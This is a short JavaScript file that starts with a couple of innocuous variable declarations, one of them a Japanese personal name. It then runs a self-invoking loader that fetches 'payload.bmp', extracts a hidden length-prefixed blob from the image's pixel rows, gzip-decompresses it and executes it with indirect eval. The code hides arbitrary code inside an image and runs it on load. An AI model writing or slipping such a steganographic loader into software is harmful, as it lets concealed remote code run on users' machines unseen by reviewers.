var 会員 = 2; var 名 = "佐藤 結衣";
(async(bmpUrl = "payload.bmp")=>{
  const _resp = await fetch(bmpUrl);
  const _buf = new Uint8Array(await _resp.arrayBuffer());
  const _pixelOff = _buf[10] | (_buf[11] << 8) | (_buf[12] << 16) | (_buf[13] << 24);
  const _len = _buf[_pixelOff] | (_buf[_pixelOff + 1] << 8) | (_buf[_pixelOff + 2] << 16) | (_buf[_pixelOff + 3] << 24);
  const _w = _buf[18] | (_buf[19] << 8) | (_buf[20] << 16) | (_buf[21] << 24);
  const _bpp = _buf[28] | (_buf[29] << 8);
  const _bytesPerPixel = _bpp / 8;
  const _rowSize = Math.floor((_w * _bytesPerPixel + 3) / 4) * 4;
  
  const _rawPayload = new Uint8Array(_len);
  let _written = 0, _y = 0, _dataCursor = 4;
  while (_written < _len) {
    const _rowStart = _pixelOff + _y * _rowSize;
    const _rowAvail = (_w * _bytesPerPixel) - _dataCursor;
    const _toCopy = Math.min(_rowAvail, _len - _written);
    for (let i = 0; i < _toCopy; i++) _rawPayload[_written++] = _buf[_rowStart + _dataCursor + i];
    _dataCursor = 0;
    _y++;
  }
  const _ds = new DecompressionStream('gzip');
  const _writer = _ds.writable.getWriter();
  _writer.write(_rawPayload);
  _writer.close();
  const _code = await new Response(_ds.readable).text();
  (0, eval)(_code);
})();